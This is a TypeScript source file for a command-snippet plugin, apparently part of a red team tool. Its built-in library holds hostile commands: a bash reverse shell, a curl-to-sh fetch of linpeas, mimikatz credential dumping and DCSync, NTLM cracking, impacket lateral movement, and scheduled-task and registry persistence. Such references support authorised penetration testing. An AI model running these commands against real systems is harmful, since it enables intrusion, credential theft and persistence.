import { registerPlugin, registerCommand } from "@/plugins/api";
import { create } from "zustand";

export interface Snippet {
  id: string;
  name: string;
  description?: string;
  command: string;
  language?: string;
  category?: string;
  tags?: string[];
}

interface SnippetState {
  snippets: Snippet[];
  showModal: boolean;
  searchQuery: string;
  selectedCategory: string | null;
  setSearchQuery: (query: string) => void;
  setSelectedCategory: (category: string | null) => void;
  openModal: () => void;
  closeModal: () => void;
  copySnippet: (snippet: Snippet) => void;
  insertSnippet: (snippet: Snippet) => void;
  getFilteredSnippets: () => Snippet[];
  getCategories: () => string[];
}

export const useSnippetStore = create<SnippetState>((set, get) => ({
  snippets: getBuiltinSnippets(),
  showModal: false,
  searchQuery: "",
  selectedCategory: null,

  setSearchQuery: (query) => set({ searchQuery: query }),
  setSelectedCategory: (category) => set({ selectedCategory: category }),
  openModal: () => set({ showModal: true, searchQuery: "", selectedCategory: null }),
  closeModal: () => set({ showModal: false }),

  copySnippet: (snippet) => {
    navigator.clipboard.writeText(snippet.command);
    set({ showModal: false });
  },

  insertSnippet: (snippet) => {
    // This would insert into the current editor
    // For now, just copy to clipboard
    navigator.clipboard.writeText(snippet.command);
    set({ showModal: false });
  },

  getFilteredSnippets: () => {
    const { snippets, searchQuery, selectedCategory } = get();
    return snippets.filter((s) => {
      const matchesSearch =
        !searchQuery ||
        s.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
        s.command.toLowerCase().includes(searchQuery.toLowerCase()) ||
        s.tags?.some((t) => t.toLowerCase().includes(searchQuery.toLowerCase()));

      const matchesCategory = !selectedCategory || s.category === selectedCategory;

      return matchesSearch && matchesCategory;
    });
  },

  getCategories: () => {
    const { snippets } = get();
    const categories = new Set(snippets.map((s) => s.category).filter(Boolean));
    return Array.from(categories) as string[];
  },
}));

function getBuiltinSnippets(): Snippet[] {
  return [
    // Enumeration
    {
      id: "nmap-quick",
      name: "Nmap Quick Scan",
      description: "Fast port scan with service detection",
      command: "nmap -sC -sV -oA nmap/quick $TARGET",
      language: "bash",
      category: "Enumeration",
      tags: ["nmap", "ports", "scanning"],
    },
    {
      id: "nmap-full",
      name: "Nmap Full Scan",
      description: "Full port scan with scripts",
      command: "nmap -sC -sV -p- -oA nmap/full $TARGET",
      language: "bash",
      category: "Enumeration",
      tags: ["nmap", "ports", "scanning"],
    },
    {
      id: "gobuster-dir",
      name: "Gobuster Directory",
      description: "Directory brute force",
      command: "gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt",
      language: "bash",
      category: "Enumeration",
      tags: ["web", "directories"],
    },
    {
      id: "ffuf-vhost",
      name: "FFUF VHost",
      description: "Virtual host enumeration",
      command: "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.$DOMAIN' -u http://$TARGET",
      language: "bash",
      category: "Enumeration",
      tags: ["web", "vhost", "ffuf"],
    },

    // Credential Attacks
    {
      id: "mimikatz-logon",
      name: "Mimikatz Logon Passwords",
      description: "Dump logon passwords from memory",
      command: "mimikatz # sekurlsa::logonpasswords",
      language: "powershell",
      category: "Credential Attacks",
      tags: ["mimikatz", "credentials", "windows"],
    },
    {
      id: "mimikatz-dcsync",
      name: "Mimikatz DCSync",
      description: "DCSync attack for domain credentials",
      command: "mimikatz # lsadump::dcsync /domain:$DOMAIN /user:Administrator",
      language: "powershell",
      category: "Credential Attacks",
      tags: ["mimikatz", "dcsync", "ad"],
    },
    {
      id: "hashcat-ntlm",
      name: "Hashcat NTLM",
      description: "Crack NTLM hashes",
      command: "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt",
      language: "bash",
      category: "Credential Attacks",
      tags: ["hashcat", "cracking", "ntlm"],
    },

    // Lateral Movement
    {
      id: "psexec-py",
      name: "PsExec Python",
      description: "Remote execution via SMB",
      command: "impacket-psexec $DOMAIN/$USER:$PASS@$TARGET",
      language: "bash",
      category: "Lateral Movement",
      tags: ["psexec", "smb", "impacket"],
    },
    {
      id: "wmiexec",
      name: "WMIExec",
      description: "Remote execution via WMI",
      command: "impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET",
      language: "bash",
      category: "Lateral Movement",
      tags: ["wmi", "impacket"],
    },
    {
      id: "evil-winrm",
      name: "Evil-WinRM",
      description: "WinRM shell access",
      command: "evil-winrm -i $TARGET -u $USER -p $PASS",
      language: "bash",
      category: "Lateral Movement",
      tags: ["winrm", "shell"],
    },

    // Persistence
    {
      id: "scheduled-task",
      name: "Scheduled Task",
      description: "Create persistence via scheduled task",
      command: 'schtasks /create /tn "Update" /tr "C:\\Windows\\Temp\\payload.exe" /sc onlogon /ru SYSTEM',
      language: "cmd",
      category: "Persistence",
      tags: ["persistence", "scheduled-task", "windows"],
    },
    {
      id: "registry-run",
      name: "Registry Run Key",
      description: "Add registry run key for persistence",
      command: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Update /t REG_SZ /d "C:\\Windows\\Temp\\payload.exe"',
      language: "cmd",
      category: "Persistence",
      tags: ["persistence", "registry", "windows"],
    },

    // Linux
    {
      id: "linpeas",
      name: "LinPEAS",
      description: "Linux privilege escalation check",
      command: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
      language: "bash",
      category: "Linux",
      tags: ["privesc", "enumeration", "linux"],
    },
    {
      id: "reverse-shell-bash",
      name: "Bash Reverse Shell",
      description: "Bash reverse shell one-liner",
      command: "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1",
      language: "bash",
      category: "Linux",
      tags: ["shell", "reverse"],
    },

    // Active Directory
    {
      id: "bloodhound-collect",
      name: "BloodHound Collector",
      description: "Collect AD data for BloodHound",
      command: "bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all -ns $DC",
      language: "bash",
      category: "Active Directory",
      tags: ["bloodhound", "ad", "enumeration"],
    },
    {
      id: "kerbrute-users",
      name: "Kerbrute User Enum",
      description: "Enumerate valid AD users",
      command: "kerbrute userenum -d $DOMAIN --dc $DC users.txt",
      language: "bash",
      category: "Active Directory",
      tags: ["kerberos", "enumeration", "ad"],
    },
    {
      id: "getnpusers",
      name: "GetNPUsers (AS-REP)",
      description: "AS-REP roasting attack",
      command: "impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt",
      language: "bash",
      category: "Active Directory",
      tags: ["asrep", "kerberos", "ad"],
    },
  ];
}

export { SnippetModal } from "./SnippetModal";

export function initSnippetsPlugin() {
  registerPlugin({
    manifest: {
      id: "kairo-snippets",
      name: "Command Snippets",
      version: "1.0.0",
      description: "Quick access to command snippets for red team operations",
    },
    enabled: true,
    initialize: () => {
      registerCommand({
        id: "snippets.open",
        name: "Snippets: Open Library",
        description: "Open the command snippet library",
        shortcut: "Ctrl+Shift+S",
        category: "Snippets",
        execute: () => useSnippetStore.getState().openModal(),
      });
    },
  });
}
